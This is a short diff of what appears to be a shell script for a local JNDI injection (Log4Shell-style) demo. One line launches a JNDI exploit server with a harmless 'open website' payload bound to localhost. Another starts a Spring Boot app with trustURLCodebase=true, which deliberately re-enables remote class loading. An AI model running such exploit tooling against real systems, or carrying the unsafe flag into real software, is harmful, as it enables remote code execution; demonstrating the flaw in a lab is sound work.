@@ -1,4 +1,4 @@
-command1="java -jar lib/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C open https://haveibeenpwned.com/ -A 127.0.0.1"
+command1="java -jar lib/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C open https://haveibeenpwned.com -A 127.0.0.1"
 command2="java -Dcom.sun.jndi.ldap.object.trustURLCodebase=true -jar target/springboot-app-0.0.1-SNAPSHOT.jar"
 
 # Find the PID of the process
